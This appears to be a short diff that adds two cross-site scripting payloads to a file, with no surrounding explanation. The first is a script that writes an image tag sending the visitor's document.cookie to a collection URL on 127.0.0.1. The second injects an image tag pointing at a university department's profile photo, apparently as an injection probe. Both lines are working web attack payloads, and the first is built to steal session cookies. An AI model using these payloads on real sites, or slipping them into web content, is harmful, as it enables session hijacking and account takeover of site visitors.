@@ -1,0 +1,2 @@
+<script>document.write('<img src=http://127.0.0.1/xss-params?cookie=' + escape(document.cookie) + '>'); </script> 
+<script>document.write('<img src=https://www.science.kmitl.ac.th/department_com/department_img/pictureProfile/01.jpg%3E'); </script>
